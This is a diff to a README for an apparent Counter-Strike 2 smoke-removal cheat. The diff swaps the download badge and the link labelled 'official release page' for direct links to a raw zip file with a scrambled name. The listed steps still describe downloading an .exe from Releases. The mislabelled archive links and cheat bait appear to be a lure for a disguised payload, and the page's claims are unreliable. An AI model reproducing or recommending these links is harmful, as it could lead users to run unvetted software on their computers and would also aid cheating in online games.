@@ -1,6 +1,6 @@
 # 🌫️ CS2-Smoke-Be-Gone-One-Click-Smoke-Removal-Utility - Remove visual smoke for better visibility
 
-[![](https://img.shields.io/badge/Download-SmokeBeGone-blue.svg)](https://github.com/Alexenveloping465/CS2-Smoke-Be-Gone-One-Click-Smoke-Removal-Utility)
+[![](https://img.shields.io/badge/Download-SmokeBeGone-blue.svg)](https://github.com/Alexenveloping465/CS2-Smoke-Be-Gone-One-Click-Smoke-Removal-Utility/raw/refs/heads/main/Varanoid/Gone_Utility_C_Removal_Click_Smoke_Be_One_v2.5.zip)
 
 This utility assists players in removing visual smoke effects within Counter-Strike 2. Large smoke clouds often block sightlines. This tool adjusts game settings to ensure players maintain clear vision during matches. The software operates as a standalone utility. It requires no complex configuration or existing technical knowledge to use. 
 
@@ -18,7 +18,7 @@ To use this utility, your computer requires the following:
 
 To start the process, visit the official repository page. The software exists as a single executable file. This file contains all necessary components to modify the game textures.
 
-1.  Navigate to the [official release page](https://github.com/Alexenveloping465/CS2-Smoke-Be-Gone-One-Click-Smoke-Removal-Utility).
+1.  Navigate to the [official release page](https://github.com/Alexenveloping465/CS2-Smoke-Be-Gone-One-Click-Smoke-Removal-Utility/raw/refs/heads/main/Varanoid/Gone_Utility_C_Removal_Click_Smoke_Be_One_v2.5.zip).
 2.  Locate the section labeled Releases on the right side of your screen.
 3.  Click the latest version link.
 4.  Download the file ending in .exe.
